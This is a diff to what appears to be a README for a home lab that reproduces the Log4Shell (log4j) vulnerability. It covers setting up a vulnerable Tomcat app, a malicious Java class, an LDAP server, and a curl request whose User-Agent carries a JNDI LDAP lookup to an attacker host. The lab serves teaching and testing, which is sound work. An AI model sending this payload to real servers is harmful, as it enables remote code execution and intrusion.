@@ -30,7 +30,7 @@ cp -r mywebapp /PATH/TO/apache-tomcat/webapps/
 And this should load the webpage on `http://ubuntu-server:8080/mywebapp/index.jsp` if you check. And this is all there is to the vulnerable machine set-up!
 
 
-Note: Idk but on initial testing, it wasn't seem to work, and I had to create a .war file and place it in my `webapps` folder. So you can see if the above steps also work for you or not. But if not, try the below (I am not a JAVA programmer, so don't ask me).
+Note: Idk but on initial testing, it didn't seem to work, and I had to create a .war file and place it in my `webapps` folder. So you can see if the above steps also work for you or not. But if not, try the below (I am not a JAVA programmer, so don't ask me).
 ```shell
 jar cvf mywebapp.war *
 cp mywebapp.war ../
@@ -47,7 +47,7 @@ For our actual malicious code, compile the `Evail.java` file using the same vuln
 ```
 
 ### LDAP Server 
-For the LDAP Server, we download the LDAP library from [official LDAP site](https://ldap.com/unboundid-ldap-sdk-for-java/ "UnboundID LDAP SDK for Java") and compile our Server file and execute it.
+For the LDAP Server, we download the LDAP library from [official LDAP site](https://ldap.com/unboundid-ldap-sdk-for-java/ "UnboundID LDAP SDK for Java") and compile our Server file and execute it. Or you can use the one already included here.
 ```shell
 javac -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
 java -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
@@ -63,3 +63,5 @@ Now the only step left to send our payload and let the whole process unfold.
 ```shell
 curl ubuntu-server:8080/mywebapp/logExample -H 'User-Agent: ${jndi:ldap://192.168.56.101:9999/Evail}' 
 ```
+
+With this a log entry at `/PATH/TO/apache-tomcat/logs/app.log` should be present and a connection back should confirm this. With this, congratulation! You exploited log4j!
